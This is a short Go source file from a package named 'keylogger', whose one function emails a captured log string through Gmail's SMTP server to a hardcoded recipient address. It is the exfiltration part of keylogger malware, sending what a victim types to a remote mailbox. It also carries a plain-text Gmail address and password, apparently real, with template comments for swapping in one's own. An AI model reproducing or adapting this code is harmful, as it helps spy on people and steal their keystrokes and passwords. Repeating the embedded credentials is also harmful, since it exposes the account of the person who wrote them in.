package keylogger

import (
	"net/smtp"
)

func sendMail(logString string) {
	from := "phamducmanh1452001@gmail.com" // "<YOUR MAIL>"
	password := "Phamducmanh145@"          // "<YOUR PASSWORD MAIL>"

	toList := []string{"prettyboy1452001@gmail.com"} // "<LIST DEST MAIL>"

	host := "smtp.gmail.com"

	port := "587"

	msg := logString

	body := []byte(msg)

	auth := smtp.PlainAuth("", from, password, host)

	go smtp.SendMail(host+":"+port, auth, from, toList, body)
}
